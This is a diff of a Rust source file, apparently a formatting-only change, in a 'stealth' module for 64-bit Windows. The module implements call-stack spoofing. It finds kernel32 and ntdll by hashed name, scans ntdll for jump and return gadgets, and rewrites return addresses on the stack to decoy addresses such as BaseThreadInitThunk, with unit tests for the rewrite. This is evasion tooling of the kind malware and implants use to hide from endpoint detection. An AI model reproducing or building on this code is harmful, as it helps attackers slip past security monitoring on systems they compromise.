@@ -37,8 +37,7 @@ fn ensure_hard_spoof_resolved() {
     unsafe {
         let k32 =
             crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
-        let ntdll =
-            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
+        let ntdll = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
 
         if k32 != 0 {
             let bait = crate::stealth::get_api_addr(
@@ -60,8 +59,12 @@ fn ensure_hard_spoof_resolved() {
                 let _ = BAIT_NT.compare_exchange(0, bait, Ordering::AcqRel, Ordering::Acquire);
             }
             if let Some((jmp_rbx, ret)) = scan_ntdll_gadgets(ntdll) {
-                let _ =
-                    GADGET_JMP_RBX.compare_exchange(0, jmp_rbx, Ordering::AcqRel, Ordering::Acquire);
+                let _ = GADGET_JMP_RBX.compare_exchange(
+                    0,
+                    jmp_rbx,
+                    Ordering::AcqRel,
+                    Ordering::Acquire,
+                );
                 let _ = GADGET_RET.compare_exchange(0, ret, Ordering::AcqRel, Ordering::Acquire);
             }
         }
@@ -207,12 +210,7 @@ fn capture_stack_returns(max: usize) -> Vec<usize> {
         let capture: CaptureFn = std::mem::transmute(addr);
         let mut frames: Vec<*mut u8> = vec![std::ptr::null_mut(); max.min(32)];
         let mut hash: u32 = 0;
-        let n = capture(
-            0,
-            frames.len() as u32,
-            frames.as_mut_ptr(),
-            &mut hash,
-        ) as usize;
+        let n = capture(0, frames.len() as u32, frames.as_mut_ptr(), &mut hash) as usize;
         frames.truncate(n);
         frames
             .into_iter()
@@ -291,11 +289,7 @@ impl HardSpoofGuard {
         ensure_hard_spoof_resolved();
         let bait_k32 = BAIT_K32.load(Ordering::Acquire);
         let bait_nt = BAIT_NT.load(Ordering::Acquire);
-        let bait_primary = if bait_k32 != 0 {
-            bait_k32
-        } else {
-            bait_nt
-        };
+        let bait_primary = if bait_k32 != 0 { bait_k32 } else { bait_nt };
 
         let rsp = read_rsp();
         let rbp = read_rbp();
@@ -346,10 +340,7 @@ impl HardSpoofGuard {
         // unrelated data. Blind *(rbp+8) rewrite → stack corruption / AV at null+0x8
         // (WER: BEX64 / StackHash / PCH_AB_FROM_ntdll on Server 2012 R2).
         let mut rbp_ret_slot = None;
-        if bait_primary != 0
-            && image.0 != 0
-            && is_plausible_frame_pointer(rsp, rbp)
-        {
+        if bait_primary != 0 && image.0 != 0 && is_plausible_frame_pointer(rsp, rbp) {
             let slot = (rbp + 8) as *mut usize;
             let slot_addr = slot as usize;
             if slot_addr >= rsp && slot_addr <= rbp.wrapping_add(0x20) {
@@ -434,8 +425,7 @@ pub fn hard_spoof_status() -> HardSpoofStatus {
 #[cfg(all(windows, target_arch = "x86_64"))]
 pub fn hard_spoof_ready() -> bool {
     let s = hard_spoof_status();
-    s.bait_kernel32 != 0
-        && (s.gadget_jmp_rbx != 0 || s.gadget_ret != 0)
+    s.bait_kernel32 != 0 && (s.gadget_jmp_rbx != 0 || s.gadget_ret != 0)
 }
 
 /// Whether the hard path (on-stack return rewrite) is allowed.
@@ -655,8 +645,7 @@ pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
                 baits.push(("BaseThreadInitThunk".to_string(), addr));
             }
         }
-        let ntdll =
-            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
+        let ntdll = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
         if ntdll != 0 {
             if let Some(addr) = crate::stealth::get_api_addr(
                 ntdll,
@@ -785,9 +774,7 @@ mod tests {
     #[test]
     fn hard_spoof_window_is_reentrant_safe() {
         // Nested hard spoof must not AV and must preserve single-exec semantics.
-        let outer = with_hard_spoofed_stack(|| {
-            with_hard_spoofed_stack(|| 7u32) + 1
-        });
+        let outer = with_hard_spoofed_stack(|| with_hard_spoofed_stack(|| 7u32) + 1);
         assert_eq!(outer, 8);
     }
 
@@ -818,7 +805,10 @@ mod tests {
             minor: 3,
             build: 9600,
         };
-        assert!(ver.major < 10, "2012R2 must not use hard stack rewrite by default");
+        assert!(
+            ver.major < 10,
+            "2012R2 must not use hard stack rewrite by default"
+        );
         let ver10 = crate::stealth::WindowsVersion {
             major: 10,
             minor: 0,
